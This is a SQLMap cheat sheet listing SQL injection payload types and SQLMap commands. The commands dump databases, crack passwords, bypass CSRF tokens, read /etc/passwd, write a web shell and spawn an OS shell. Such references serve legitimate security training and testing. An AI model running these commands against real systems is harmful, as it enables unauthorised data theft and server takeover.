# SQLMap Essentials Cheat Sheet

## BEUSTQ 

BEUSTQ is SQLMap's default technique setting, representing SQLi types: 

- B (Boolean-based blind)
- E (Error-based)
- U (Union query-based)
- S (Stacked queries)
- T (Time-based blind)
- Q (Inline queries).

## SQL Injection Types

| Type                | Description                              | Example                          | Key Points                               |
|---------------------|------------------------------------------|----------------------------------|------------------------------------------|
| Boolean-Based Blind | Infers data via true/false responses.    | `AND 1=1`                        | Useful with no output; slow, character-by-character. |
| Error-Based         | Triggers errors to reveal data.          | `AND GTID_SUBSET(@@version,0)`   | Fast for chunks; requires visible errors. |
| Union Query-Based   | Appends results with UNION.              | `UNION ALL SELECT 1,@@version,3` | Fastest with direct output; needs column match. |
| Stacked Queries     | Executes multiple statements.            | `; DROP TABLE users`             | For non-query statements; DBMS-specific. |
| Time-Based Blind    | Delays response for inference.           | `AND 1=IF(2>1,SLEEP(5),0)`       | Useful with no response change; slower due to delays. |
| Inline Queries      | Embeds query within original.            | `SELECT (SELECT @@version) from` | Uncommon; for specific app structures.   |

## Commands

[SQLMap wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

**Note:** When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. --crawl, --forms or -g).

**Note:** SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers, specify the "custom" injection mark after the header's value (e.g. --cookie="id=1*").

| Command | Description |
|---------|-------------|
| `sqlmap -h` | View the basic help menu |
| `sqlmap -hh` | View the advanced help menu |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch` | Run SQLMap without asking for user input, id will be tested |
| `sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'` | Run SQLMap with request headers, use copy as curl in developer tools and replace `curl` with `sqlmap` |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` | SQLMap with POST request, uid and name will be tested |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk, can be used within saved request file also |
| `sqlmap -r req.txt` | Passing an HTTP request file to SQLMap, right-click the request within Burp and choose Copy to file or Copy > Copy Request Headers in browser (can use JSON formatted and XML formatted HTTP requests, copy raw request from network tab in dev tools) |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header |
| `sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header |
| `sqlmap -u "http://www.example.com/?id=1" --random-agent` | Randomly select a User-agent header value or use `--mobile` switch to imitate the smartphone |
| `sqlmap -u www.target.com --data='id=1' --method PUT` | Specifying a PUT request |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5` | Specifying the level and risk |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --schema` | Database schema enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user` | Searching for data |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass |
| `sqlmap --list-tampers` | List all tamper scripts |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell` | Spawning an OS shell |

